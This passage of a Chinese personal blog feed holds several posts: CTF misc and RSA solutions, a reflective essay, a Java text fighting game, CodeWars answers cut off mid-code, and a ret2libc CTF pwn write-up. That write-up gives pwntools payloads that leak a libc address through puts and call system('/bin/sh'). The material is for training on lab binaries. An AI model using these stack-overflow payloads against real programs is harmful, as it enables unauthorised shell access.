C2</code>，以<strong>像素</strong>为单位</p><p>接下来五字节依次表示：</p><p>图像深度，如上图中<code>08</code></p><p>颜色类型，如上图中<code>06</code></p><p>压缩方法，如上图中<code>00</code></p><p>滤波器方法，如上图中<code>00</code></p><p>隔行扫描方法，如上图中<code>00</code></p><p>接下来的四字为CRC32校验码，如上图中<code>A8 58 6B 45</code></p><p><img src="/../img/1257459-20210225224618206-432098847.png" alt="1257459-20210225224618206-432098847"></p><p>参考文献（选自）：<a href="https://www.cnblogs.com/mengfanrong/p/3801583.html">PNG文件格式具体解释 - mengfanrong - 博客园 (cnblogs.com)</a></p><h2 id="ANSI-escape-code"><a href="#ANSI-escape-code" class="headerlink" title="ANSI escape code"></a>ANSI escape code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">FILE = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeThings</span>(<span class="hljs-params">b</span>):<br>    FILE.write(b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MoveLeft</span>(<span class="hljs-params">n=<span class="hljs-number">1</span></span>):<br>    writeThings(<span class="hljs-string">b&#x27;\x1b[C&#x27;</span> * n)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MoveRight</span>(<span class="hljs-params">n=<span class="hljs-number">1</span></span>):<br>    writeThings(<span class="hljs-string">b&#x27;\x1b[D&#x27;</span> * n)<br>FLAG = <span class="hljs-string">b&#x27; 12312344444444&#x27;</span> <br><span class="hljs-keyword">import</span> random<br>COUNT = <span class="hljs-number">2022234</span><br>randpos = [random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(FLAG) - <span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(COUNT)]<br>randchar = [random.randint(<span class="hljs-number">0x20</span>, <span class="hljs-number">0x7e</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(COUNT)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(FLAG)):<br>    pos = COUNT<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(COUNT - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> (randpos[j] == i):<br>            pos = j<br>            <span class="hljs-keyword">break</span><br>    randchar[pos] = FLAG[i]<br>writeThings(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>POS = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(COUNT):<br>    <span class="hljs-keyword">if</span> (randpos[i] &gt; POS):<br>        MoveLeft(randpos[i] - POS)<br>    <span class="hljs-keyword">elif</span> (randpos[i] &lt; POS):<br>        MoveRight(POS - randpos[i])<br>    writeThings(<span class="hljs-built_in">bytearray</span>([randchar[i]]))<br>    POS = randpos[i] + <span class="hljs-number">1</span><br>writeThings(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ANSI escape code 控制光标移动输出随机字符，输出量足够多然后找到flag<br>cmd type flag &#x2F;&#x2F; Terminal cat flag &#x2F;&#x2F; Powershell cat flag type flag &#x2F;&#x2F; type效率很低，很慢</p><h2 id="已知-e-n-c-的RSA"><a href="#已知-e-n-c-的RSA" class="headerlink" title="已知(e, n, c)的RSA"></a>已知(e, n, c)的RSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> binascii<br>c=<span class="hljs-number">110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582</span><br>n=<span class="hljs-number">135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789</span><br>e=<span class="hljs-number">65537</span><br>p = <span class="hljs-number">11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813</span><br>q = <span class="hljs-number">12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e,phi)<br>m = gmpy2.powmod(c,d,n)<br><br><span class="hljs-built_in">print</span>(binascii.unhexlify(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure><p>p，q在<a href="http://www.factordb.com/">factordb.com</a>进行质因数分解</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>MISC</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022双十二凌晨思考人生——《有一天花开》</title>
    <link href="/2022/12/12/2022%E5%8F%8C%E5%8D%81%E4%BA%8C%E5%87%8C%E6%99%A8%E6%80%9D%E8%80%83%E4%BA%BA%E7%94%9F/"/>
    <url>/2022/12/12/2022%E5%8F%8C%E5%8D%81%E4%BA%8C%E5%87%8C%E6%99%A8%E6%80%9D%E8%80%83%E4%BA%BA%E7%94%9F/</url>
    
    <content type="html"><![CDATA[<p>今天是2022.12.12。</p><p>看视频看不进去了，于是静了下来。</p><p>19年来，我回顾发生了什么。</p><p>于是，我发现了，情感问题一直是重灾区。</p><span id="more"></span><h3 id="有一天花开"><a href="#有一天花开" class="headerlink" title="有一天花开"></a>有一天花开</h3><p>有一天花开，梦落在彼岸。我想着花儿会飞向我，然而花儿却正在离我远去。世间的花儿很多，但很巧遇到开花的不多，于是我便开始追赶，追赶远去的花儿，追赶无名的花儿。</p><p>我原本欣喜着，花儿有机会接近了，却不慎发现，花儿总是与我保持着令我困顿的距离。无论我跑得多快，这些距离依旧无法弥补。我仿佛进入了一片沼泽，一片泥泞，挣扎着前进，却又寸步难行。</p><p>犹记得风儿喧嚣，闹得甚欢。有时却又悲恸了起来，悲哀着我的不幸。我很感谢他们没有悲哀我的不争，至少我成功了一部分。</p><p>有些事，是所有人都见得到的，却不是所有人应该知道的。于是，风在诉说着：放弃吧，放弃吧。我控诉着风，对于风自顾自地托起花儿飞走感到不满。风儿却说：这花儿一直是自己在飞，我也是在帮你了。我讶异，什么样的花儿是如此地倔强，我又因为什么，不能被花儿入眼。</p><p>我呼着花儿，拼了命地赶。而越往前，路越困难。这朵花我想我总想摘下，也不是为了有嘉奖于自己；也不是追赶得久了，觉得花儿对自己有所亏欠；更不是花儿于我有仇，或是有恩。</p><p>不过是，我想念这花儿，在寒风中凛立；我喜爱这花儿，在我的心中生根发芽。</p><p>所以，我想着一直追着这朵花，直到我自己的离世。我总是对花儿有着欢喜的，无论是凋谢、腐败。毕竟我总是要戴着花去进步的。</p>]]></content>
    
    
    <categories>
      
      <category>Outset</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Outset</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java小游戏——文字格斗 尝试</title>
    <link href="/2022/11/27/Java%E5%B0%8F%E6%B8%B8%E6%88%8F%E2%80%94%E2%80%94%E6%96%87%E5%AD%97%E6%A0%BC%E6%96%97-%E5%B0%9D%E8%AF%95/"/>
    <url>/2022/11/27/Java%E5%B0%8F%E6%B8%B8%E6%88%8F%E2%80%94%E2%80%94%E6%96%87%E5%AD%97%E6%A0%BC%E6%96%97-%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Java小游戏——文字格斗-尝试"><a href="#Java小游戏——文字格斗-尝试" class="headerlink" title="Java小游戏——文字格斗 尝试"></a>Java小游戏——文字格斗 尝试</h1><span id="more"></span><h2 id="GameRole类"><a href="#GameRole类" class="headerlink" title="GameRole类"></a>GameRole类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GameRole</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> health;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> DamageLow;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> DamageHigh;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">GameRole</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">GameRole</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> health, <span class="hljs-type">int</span> DamageLow, <span class="hljs-type">int</span> DamageHigh)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.health = health;<br>        <span class="hljs-built_in">this</span>.DamageLow = DamageLow;<br>        <span class="hljs-built_in">this</span>.DamageHigh = DamageHigh;<br>    &#125;<br>    <br>    <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDamageLow</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> DamageLow;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDamageLow</span><span class="hljs-params">(<span class="hljs-type">int</span> damageLow)</span> &#123;<br>        DamageLow = damageLow;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDamageHigh</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> DamageHigh;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDamageHigh</span><span class="hljs-params">(<span class="hljs-type">int</span> damageHigh)</span> &#123;<br>        DamageHigh = damageHigh;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHealth</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> health;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHealth</span><span class="hljs-params">(<span class="hljs-type">int</span> health)</span> &#123;<br>        <span class="hljs-built_in">this</span>.health = health;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">damage</span><span class="hljs-params">(GameRole AnotherRole)</span> &#123;      <span class="hljs-comment">//当前角色攻击</span><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">damageRandom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">int</span> damage;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">this</span>.getDamageLow() == <span class="hljs-number">1</span>) damage = damageRandom.nextInt(<span class="hljs-built_in">this</span>.getDamageHigh()) + <span class="hljs-built_in">this</span>.getDamageLow();<br>        <span class="hljs-keyword">else</span> damage = damageRandom.nextInt(<span class="hljs-built_in">this</span>.getDamageHigh() - <span class="hljs-number">1</span>) + <span class="hljs-built_in">this</span>.getDamageLow();<br>        <br>        <span class="hljs-type">int</span> <span class="hljs-variable">remainHealth</span> <span class="hljs-operator">=</span> AnotherRole.getHealth() - damage;<br>        remainHealth = (remainHealth &lt;= <span class="hljs-number">0</span>) ? <span class="hljs-number">0</span> : remainHealth;<br>        <br>        System.out.printf(<span class="hljs-string">&quot;%s攻击%s,造成%d伤害，%s剩余%d生命值%n&quot;</span>,<br>                <span class="hljs-built_in">this</span>.getName(), AnotherRole.getName(), damage,<br>                AnotherRole.getName(), remainHealth);<br>        <br>        AnotherRole.setHealth(remainHealth);<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Main类及main方法"><a href="#Main类及main方法" class="headerlink" title="Main类及main方法"></a>Main类及main方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;Player1: Health: 200 &amp; Damage: [1, 20]&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Player2: Health: 100 &amp; Damage: [2, 40]&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Input Player1&#x27;s Name:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Player1Name</span> <span class="hljs-operator">=</span> sc.next();<br>        System.out.println(<span class="hljs-string">&quot;Input Player2&#x27;s Name:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">Player2Name</span> <span class="hljs-operator">=</span> sc.next();<br>        <br>        <span class="hljs-type">GameRole</span> <span class="hljs-variable">Player1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GameRole</span>(Player1Name, <span class="hljs-number">200</span>, <span class="hljs-number">1</span>, <span class="hljs-number">20</span>);<br>        <span class="hljs-type">GameRole</span> <span class="hljs-variable">Player2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GameRole</span>(Player2Name, <span class="hljs-number">100</span>, <span class="hljs-number">2</span>, <span class="hljs-number">40</span>);<br>        <br>        <span class="hljs-keyword">while</span>(Player1.getHealth() != <span class="hljs-number">0</span> &amp;&amp; Player2.getHealth() != <span class="hljs-number">0</span>) &#123;<br>            <br>            Player1.damage(Player2);<br>            <span class="hljs-keyword">if</span>(Player2.getHealth() == <span class="hljs-number">0</span>) &#123;<br>                System.out.printf(<span class="hljs-string">&quot;Player1(%s) Win!&quot;</span>, Player1.getName());<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <br>            Player2.damage(Player1);<br>            <span class="hljs-keyword">if</span>(Player1.getHealth() == <span class="hljs-number">0</span>) &#123;<br>                System.out.printf(<span class="hljs-string">&quot;Player2(%s) Win!&quot;</span>, Player2.getName());<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="/../img/Java%E5%B0%8F%E6%B8%B8%E6%88%8F%E6%96%87%E5%AD%97%E6%A0%BC%E6%96%97%E6%BC%94%E7%A4%BA.png" alt="Java小游戏文字格斗演示"></p><h2 id="平衡度"><a href="#平衡度" class="headerlink" title="平衡度"></a>平衡度</h2><p>理论上倾向于Player2，</p><p>Player2打出伤害∈[2, 19]的概率为18&#x2F;39，打出伤害∈[21, 40]为20&#x2F;39；</p><p>Player1打出伤害∈[1, 9]的概率为9&#x2F;20，打出伤害∈[11, 20]为9&#x2F;20。</p><p><strong>以上均为理论概率，底层随机数实现未进行更多了解，若有大佬欢迎联系补充。</strong></p><h2 id="为什么这样设计"><a href="#为什么这样设计" class="headerlink" title="为什么这样设计"></a>为什么这样设计</h2><p>觉得(100, 1, 20)的设计太扁平了，没有美感（）。</p><p>就是个人不喜欢这种完全平衡的，比较喜欢相对平衡的。</p><h2 id="为什么开始学Java了-Java好玩吗"><a href="#为什么开始学Java了-Java好玩吗" class="headerlink" title="为什么开始学Java了 Java好玩吗"></a>为什么开始学Java了 Java好玩吗</h2><p>准备免修</p><p>不好玩，语法有点麻烦</p><p>并且还是习惯同时了解一些底层的东西</p><p>例如说.pyc .pyo .class</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc3类型题思路总结</title>
    <link href="/2022/11/17/ret2libc3%E7%B1%BB%E5%9E%8B%E9%A2%98%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <url>/2022/11/17/ret2libc3%E7%B1%BB%E5%9E%8B%E9%A2%98%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>注：作者会常用io声明为process类的类名，elf声明为ELF文件对应的ELF类的类名，libc声明为libc文件对应的ELF类的类名。</p><span id="more"></span><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p>题目来源：CTF-wiki</p><p>题目环境：ELF i386 未知libc版本</p><p>本题保护如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs wiki">Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)<br></code></pre></td></tr></table></figure><p>本题可能是大多数人第一次接触ELF这个类</p><p><img src="/../img/ELF%E7%B1%BB%E4%BB%8B%E7%BB%8D.png" alt="ELF类介绍"></p><p>（翻译：封装有关ELF文件的信息）</p><p>本题思路如下图</p><p>![re2libc3类型题](..&#x2F;img&#x2F;re2libc3-CTF-wiki.png</p><p>本题用于输出而定义的、处于.got.plt表中的函数有puts(const char *s)、printf(const char *format, …)，由于printf参数不可控，所以我们常使用puts函数去泄露任一函数在got表中的地址。第一次栈溢出ret2的地址就应为下次溢出开始之前，为了方便，我们可以选择main函数，亦或是_start函数。例如说若本题我们选择泄露__libc_start_main这个函数对应的got表地址，则第一段payload可以构造为：</p><p><code>payload = b&#39;a&#39; * 112 + p32(puts_plt) + p32(_start_addr) + p32(__libc_start_main_got) </code></p><blockquote><p>注：不能选择_start、_init、_fini作为预期被泄露函数，因为GNU把这三个作为了程序启动和结束的最基本运行库函数，分别放在crt1.o、crti.o、crtn.o这三个object文件中供程序链接时使用，而不是在libc.so.6中。</p></blockquote><p>既然利用了puts函数打印了其地址，那么就应该接收再去利用。我们就可以选择使用process类中的recv()去接收，在Python中以列表&#x2F;bytes的形式存储，于是我们可以用pwntools中的u32()去解包并返回一个整型数。如果认为接收的部分多于自己需求的部分，可详查Python List的用法，如[::]中第一个参数是起始点（默认为0），第二个参数为结束点（默认为len(list)），前两个参数取左闭右开区间；最后一个参数为步长，即经过多少个数记录一次并返回该值，如：</p><p><code>__libc_start_main_addr = u32(io.recv()[:4])</code></p><p>本题最终需要执行的是system(“&#x2F;bin&#x2F;sh”)，那么就应该是找到<em>system</em>函数在libc当中的地址和*&#x2F;bin&#x2F;sh*字符串在libc当中的地址。而这些内容作为动态链接库的一部分自然也是“相对”动态的。而这“相对”，就在于其中库中所有内容的偏移量相对于库的基址是固定的，在我们需要的时候，我们就可以把它们“倾倒”（dump）出来然后供自己使用。</p><p>so作为动态链接库文件仍有一个很重要的特性，就是由于libc基址的十六进制数的后三位一定为0，所以可以利用泄露出的函数地址的后三位去确定libc版本。而为了简化这个过程，我们常采用LibcSearcher这个工具：</p><p><code>libc = LibcSeacher(&quot;__libc_start_main&quot;, __libc_start_main_addr)</code></p><p>由此，我们便得到了libc的版本，于是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = __libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>最终再次构造payload</p><p><code>payload = b&#39;a&#39; * 104 + p32(system_plt) + p32(0xdeadbeef) + p32(binsh_addr)</code></p><h2 id="babyof"><a href="#babyof" class="headerlink" title="babyof"></a>babyof</h2><p>题目来源：2021 鹤城杯</p><p>题目环境：ELF amd64 已知libc版本（Ubuntu18，对应glibc2.27）</p><p>不多说，pwntools包是必须要导入的。</p><p>查栈空间，大小为72字，payload先填充72字的内容。</p><p>经过readelf（-d），看上了__gmon_start__函数，</p><blockquote><p>找到了这篇文章<a href="https://link.jianshu.com/?t=http://stackoverflow.com/questions/12697081/what-is-gmon-start-symbol">What is <strong>gmon_start</strong> symbol?</a><br> 大致的意思就是说call_gmon_start函数初始化gmon profiling system，这个系统是在编译程序时加上-pg选项，程序通过gprof可以输出函数调用等信息。 <strong>gmon_start</strong> 指向 gmon初始化函数, 该函数开始记录 profiling信息并在 atexit()中注册了一个清理函数。<br> 上面提到的函数和功能都是在glibc中实现，下面看一下glibc的源码，在sysdeps&#x2F;generic&#x2F;initfini.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">call_gmon_start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>   <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> __gmon_start__ (<span class="hljs-type">void</span>) __attribute__ ((weak)); <span class="hljs-comment">/*weak_extern (__gmon_start__);*/</span><br>   <span class="hljs-type">void</span> (*gmon_start) (<span class="hljs-type">void</span>) = __gmon_start__;<br> <br>   <span class="hljs-keyword">if</span> (gmon_start)<br>    gmon_start ();<br>&#125;<br></code></pre></td></tr></table></figure><p>所以<strong>gmon_start</strong>会出现在重定向符号表中。<br> call_gmon_start的调用是在_inti即.init段的代码中。</p><p>至于上面提到的profile系统的作用和<strong>gmon_start</strong> 函数的作用请参考<a href="https://link.jianshu.com/?t=http://www.cnblogs.com/lenolix/archive/2010/12/13/1904868.html">C++ Profiler工具之初体验</a></p></blockquote><p>_gmon_start__函数会出现在init函数中，即出现于.init代码段中，init函数ret地址为0x400743，利用该retn去返回到</p><p>主函数ret地址为</p>]]></content>
    
    
    <categories>
      
      <category>CTFPWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CodeWars系列题目（持续更新）</title>
    <link href="/2022/11/17/CodeWars%E7%B3%BB%E5%88%97%E9%A2%98%E7%9B%AE%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <url>/2022/11/17/CodeWars%E7%B3%BB%E5%88%97%E9%A2%98%E7%9B%AE%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="lt-8kyu-gt-Opposites-Attract"><a href="#lt-8kyu-gt-Opposites-Attract" class="headerlink" title="&lt;8kyu&gt; Opposites Attract"></a>&lt;8kyu&gt; Opposites Attract</h2><p>题目描述：</p><p>Timmy &amp; Sarah think they are in love, but around where they live, they will only know once they pick a flower each. If one of the flowers has an even number of petals and the other has an odd number of petals it means they are in love.</p><span id="more"></span><p>Write a function that will take the number of petals of each flower and return true if they are in love and false if they aren’t.</p><p>三目运算符一行解：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">lovefunc</span><span class="hljs-params">(<span class="hljs-type">int</span> f1, <span class="hljs-type">int</span> f2)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span>(((f1%<span class="hljs-number">2</span>)&amp;&amp;!(f2%<span class="hljs-number">2</span>))|(!(f1%<span class="hljs-number">2</span>)&amp;&amp;(f2%<span class="hljs-number">2</span>))) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>懒死我得了……</p><h2 id="lt-7kyu-gt-String-ends-with"><a href="#lt-7kyu-gt-String-ends-with" class="headerlink" title="&lt;7kyu&gt; String ends with?"></a>&lt;7kyu&gt; String ends with?</h2><p>题目描述：</p><p>Complete the solution so that it returns true if the first argument(string) passed in ends with the 2nd argument (also a string).</p><p>基础小逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">solution</span><span class="hljs-params">(std::string <span class="hljs-type">const</span> &amp;str, std::string <span class="hljs-type">const</span> &amp;ending)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len1 = str.<span class="hljs-built_in">length</span>(), len2 = ending.<span class="hljs-built_in">length</span>();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= len2; i++) &#123;<br>        <span class="hljs-keyword">if</span>(str[len1-i] != ending[len2-i]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    